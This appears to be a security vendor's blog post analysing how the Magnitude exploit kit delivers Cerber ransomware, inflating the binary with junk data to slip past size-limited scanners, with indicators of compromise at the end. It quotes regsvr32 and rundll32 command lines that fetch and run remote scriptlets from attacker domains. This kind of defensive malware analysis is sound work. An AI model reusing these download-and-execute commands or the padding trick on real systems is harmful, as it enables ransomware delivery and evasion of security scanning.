@@ -1,0 +1,69 @@
+Cerber ransomware delivered in format of a different order of Magnitude
+As a follow up to our study into the Magnitude exploit kit and its gate (which we profiled in a previous blog post), we take a look at an interesting technique used to distribute the Cerber ransomware.
+Exploit kits are a very effective means of serving malicious payloads and an important aspect is the delivery mechanism in itself. The typical scenario is for the exploit code to download a payload to disk and then run it. But there are exceptions which we have witnessed in the past:
+
+a single encrypted payload is downloaded and then split into two different binaries on disk (ref: Redkit exploit kit does the splits)
+payload is downloaded straight into memory, without touching the disk AKA fileless (ref: Angler EK : now capable of “fileless” infection)
+
+There may be different motivations behind such deviations from the standard drive-by download methodology, but typically the goal is to evade antivirus scanners/signatures by adopting a less common behaviour.
+Today, we take a look at yet another technique which has been used by Magnitude EK where the payload is largely inflated before it is run.
+Overview
+The Magnitude exploit kit has been using an XML configuration file critical to retrieving the malware payload (Cerber) for several months already, and some researchers have run into it before [1] [2] [3].
+Around the end of July – according to our captures – we spotted a new for loop which assigns a variable that is being concatenated. This piece of code adds ‘junk’ to the existing Cerber binary on-the-fly, to grow its initial size from say, 245 KB*, to anywhere between 70 to 100 MB*.
+
+Figure 1: Workflow from Magnitude EK to Cerber infection via larger malicious binary
+* these numbers are from a specific capture and will vary based on changes made to Magnitude EK
+This is not a bug, but rather, as they say, “a feature” which allows to bypass security products that have a hard limit on file sizes they can scan. In the rest of this post, we will describe how this process known as binary padding is implemented in Magnitude EK.
+Delivery chain
+Magnitude EK is notorious for distributing the Cerber ransomware specifically to certain geolocations, and in particular South Korea, via its own gate, called Magnigate. For a while, we have noticed that Magnitude EK has been using Internet Explorer vulnerabilities without necessarily resorting to Flash exploits. Another interesting artifact part of the EK flow is the use of an XML configuration file which contains JScript code.
+
+Figure 2: Network traffic view showing the EK’s main artifacts
+XML Configuration
+In prior instances of Magnitude EK, regsvr32.exe was used to retrieve and execute the binary payload (without any size modification) using the scriptlet passed as a URL parameter. Originally, we saw the payload being launched from the %temp% folder but sometime in mid-July it also ran from the Desktop (perhaps a transition?):
+“C:\Windows\System32\regsvr32.exe” scrobj.dll /s /u /n /i:http://e6cgbdc11cx350s4.lessnot.men/f62241e72664fd04fed6f79656757d9d.sct
+On July 31st, we noticed rundll32.exe with a different looking command still parsing the remote scriptlet:
+
+Figure 3: From browser exploit to malicious JScript via rundll32
+“C:\Windows\System32\rundll32.exe” javascript:”\..\mshtml,RunHTMLApplication “;document.write();GetObject(‘script:http://7fm0cd7d16w37.noneno.space/4a44e2019f2e77c83f55c5c223bf10a0‘);
+
+Figure 4: The XML config, showing the embedded JScript
+Binary padding
+The purpose of this script is to retrieve the original Cerber payload (245 KB) and add data (95 MB) to it via a technique known as binary padding. The Shell aplication uses ADODB.Stream to save “text” data (N4mQj8624F9Npw10s61F) with a particular charset (iso-8859-1) used for text to binary data conversion.
+The reason this data amounts to 95 MB is because it concatenates that string via a loop 14 times, which is the equivalent of writing “N4mQj8624F9Npw10s61F” 4,782,969 million times (3^14) and saving it to a file.
+
+Figure 5: Crafting the inflated binary by appending a text string millions of times
+rundll32.exe downloads the original Cerber and adds the junk data on the fly:
+
+Figure 6: Process view showing data being written to the new, inflated Cerber binary
+
+Figure 7: Hexadecimal view of the final binary, showing the added ‘junk’ data
+Finally, it runs it:
+
+Figure 8: The new Cerber binary is invoked via rundll32
+A few seconds later, Cerber has encrypted files and displays the ransom note:
+
+Figure 9: Wallpaper hijack shows the ransom note
+Tricks of the trade
+While Magnitude EK has a very narrow distribution channel, it remains an interesting exploit kit because not only does it have its own gate, but it also continues to evolve with various tricks. The binary padding technique shows an effort to bypass certain security scanners that will ignore files above a certain size. However, this does not prevent the malicious binary (no matter how big) to run its course and fully infect a machine.
+Protection
+The key to protecting against these kinds of attacks is to block threats regardless of the shape they come as and thwart them as early as possible in the delivery chain. Malwarebytes stops Magnitude EK proactively using its anti-exploit module before the malicious payload is even downloaded. As an added protection layer, our anti-ransomware component also stops this ‘larger than usual’ Cerber.
+
+Figure 10: Malwarebytes blocking the Magnitude exploit kit in its drive-by download attempt
+
+Figure 11: Malwarebytes (other protection modules disabled for testing) stopping the ransomware infection
+References
+[1] https://pcsxcetrasupport3.wordpress.com/2017/04/24/a-look-at-the-magnitude-exploit-kit-encoding/
+[2] https://www.zscaler.com/blogs/research/wonder-woman-piracy-and-cerber-ransomware
+[3] https://zerophagemalware.com/2017/08/01/magnitude-ek-xml-package-and-changes/
+Indicators of compromise
+Magnitude EK
+217.182.227.103,spinner-art.org,Magnigate (step 1)
+151.80.246.147,511bcl9645285d2w.himlead.com,Magnigate (step 2)
+51.254.229.220,7fm0cd7d16w37.noneno.space,Magnitude EK Landing
+51.254.229.220,7fm0cd7d16w37.noneno.space,Magnitude XML/JScript
+51.254.229.220,7fm0cd7d16w37.noneno.space,Cerber (original)
+Cerber (original)
+4bdd366d8ee35503cf062ae22abe5a4a2d8d8907
+
+Cerber (inflated)
+3da8e94c6d1efe2a039f49a1e748df5eef01af5a
